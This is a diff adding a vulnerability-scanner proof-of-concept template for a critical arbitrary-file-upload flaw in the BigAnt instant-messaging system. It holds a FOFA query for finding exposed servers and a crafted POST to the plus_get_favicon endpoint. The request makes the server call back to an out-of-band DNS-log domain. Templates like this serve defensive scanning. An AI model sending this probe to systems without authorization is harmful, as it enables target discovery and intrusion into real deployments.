@@ -1,0 +1,20 @@
+id: poc-yaml-jiuqitech-bigant-ims-plus-get-favicon-upload
+info:
+  name: 九麒科技 BigAnt 即时通讯系统 plus_get_favicon 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 任意上传
+  finger: 即时通讯系统
+  fofa: body="/Public/static/admin/admin_common.js"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /?m=Admin&c=Plus&a=plus_get_favicon
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: plus_uri=http://{{.domain}}&app_id=pc_client
+  expression: status_code == 200 && contains(body,"\"status\":0") && contains(body,"\"err_code\":3002")
+    && contains(body,"not found the $match") && reverse.Verify()
+transport: http
